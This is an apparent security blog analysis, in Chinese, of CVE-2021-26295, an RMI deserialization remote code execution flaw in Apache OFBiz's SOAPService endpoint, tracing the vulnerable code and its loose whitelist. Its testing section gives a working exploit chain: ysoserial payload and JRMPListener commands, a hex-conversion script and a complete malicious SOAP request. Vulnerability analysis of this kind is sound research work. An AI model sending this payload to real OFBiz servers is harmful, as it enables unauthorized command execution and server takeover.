# CVE-2021-26295 Apache OFBiz 反序列化分析

阅读量 **389621**

|评论 **1**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-04-16 10:30:09

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p2.ssl.qhimg.com/t0187b13ee541cc356e.jpg)

## 漏洞简介

2021年3月22日 Apache
OFBiz官方发布安全更新，修复了一处由RMI反序列化造成的远程代码执行漏洞。攻击者可构造恶意请求，触发反序列化，从而造成任意代码执行，控制服务器。

漏洞影响版本：apache:ofbiz<17.12.06

官网：<https://ofbiz.apache.org/>

项目下载地址：<https://archive.apache.org/dist/ofbiz/>

补丁代码：<https://github.com/apache/ofbiz-framework/commit/af9ed4e/>

漏洞触发路径:https://ip:8433/webtools/control/SOAPService

## 调试环境搭建

这个反序列化漏洞本身相对简单，但是搭建调试环境的时候费了好些功夫。

工具：Idea + [apache-ofbiz-17.12.01.zip](https://archive.apache.org/dist/ofbiz/apache-ofbiz-17.12.01.zip) \+ gradle-6.8.3 + jdk11 + jkd1.8

jdk11是gradle用来构建项目的，jdk1.8是用来运行项目的。大概过程如下：

首先Idea打开整个ofbiz工程，配置gradle目录

![](https://p0.ssl.qhimg.com/t01acf5a501a24bac71.png)

高版本的gralde需要jdk11以上环境（一开始我配的是jdk1.8，但是构建项目就报错了），确定之后，然后就进入漫长的等待时间，然后build一下

![](https://p1.ssl.qhimg.com/t019863a63119093b9a.png)

Build完成后，会在项目目录下生成build文件夹，以及ofbiz.jar等文件。

![](https://p4.ssl.qhimg.com/t016f892448edbeb6b9.png)

然后edit congfigurations 添加JAR Application

![](https://p1.ssl.qhimg.com/t01fc4db07ead6e03d9.png)

调试运行（jdk要选1.8的，用jdk11会报错），然后在framework\webapp\src\main\java\org\apache\ofbiz\webapp\event\SOAPEventHandler.java
public String invoke(*)下断点。

网页访问：/webtools/control/SOAPService，成功断下。

![](https://p1.ssl.qhimg.com/t01a493402f222b3995.png)

## 漏洞跟踪调试

我们先看下payload格式，再跟踪代码流程。

当访问<https://ip:8443/webtools/control/SOAPService>时，程序会进入SOAPEventHandler模块进行处理，具体网站路径的路由控制可以参考<https://xz.aliyun.com/t/8184/>这篇文章。函数负责接收soap数据，并进调用SoapSerializer.deserialize()函数进行反序列化处理，代码如下：

![](https://p5.ssl.qhimg.com/t018efacf409df0dad5.png)

然后调用XmlSerializer.deserialize()

然后调用deserializeSingle()函数,这个函数需要重点关注，函数决定你构造的payload的格式。

函数首先获取了我们的标签cus-obj,然后和一些标签进行比较，如果没有匹配到，则调用deserializeCustom()函数，获取标签内的值，然后将16进制转化成字节数组。然后调用readObject()将字节数组反序列化,触发漏洞。

这里函数里使用了SafeObjectInputStream类，做了一些安全处理，加了白名单机制，只允许白名单内的类进行反序列化。

我对比看了下ofbiz16版本系列的，这里是没有SafeObjectInputStream过滤的。

应该是官方自己发现这里有反序列化漏洞问题，所有加了白名单机制，限制了反序列化的类，但是在加白名单时比较松散,“java.”白名单范围太大，导致漏洞依然可以被利用，使用ysoserial的rmi
payload依然可以做到任意命令执行。

最新版本的补丁，添加了java.rmi.server的过滤。

![](https://p3.ssl.qhimg.com/t019b2bfcd7410f1ad4.png)

## 漏洞测试

1、生成payload

    
    
    java -jar ysoserial-master-30099844c6-1.jar JRMPClient "127.0.0.1:1099" > calc.ser

2、将calc.ser转成16进制

    
    
    import binascii
    
    filename = 'calc.ser'
    
    with open(filename, 'rb') as f:
    
        content = f.read()
    
    print(binascii.hexlify(content))

3、java -cp ysoserial-master-30099844c6-1.jar ysoserial.exploit.JRMPListener
1099 CommonsBeanutils1 “calc”

4、构造payload发送到目标服务器

    
    
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    
        <soapenv:Header/>
    
        <soapenv:Body>
    
    <ser> <cus-obj>aced0005737d00000001001a6a6176612e726d692e72656769737472792e5265676973747279787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707372002d6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c657200000000000000020200007872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000078707732000a556e696361737452656600093132372e302e302e310000044b000000000b3e7d8b00000000000000000000000000000078</cus-obj>
    
    </ser>
    
        </soapenv:Body>
    
    </soapenv:Envelope>

## 总结思考

1、我在跟踪调试时，发现触发这个漏洞的流程并不只这一条，还有其他方式可以触发该漏洞，有兴趣的可以找一下。

2、总感觉他这个白名单范围过大，如果以后有大佬找到新的利用链，那这个白名单很可能被绕过。

参考：

1、 <https://xz.aliyun.com/t/8184/>

2、 https://www.o2oxy.cn/3271.html

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **PandaIsCoding** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/237953](/post/id/237953)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [漏洞分析](/tag/漏洞分析)
  * [OFBiz](/tag/OFBiz)

 **+1** __1赞

 __收藏

![](https://p3.ssl.qhmsg.com/dm/200_200_100/t011f2416f5f80ad992.jpg)
PandaIsCoding

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

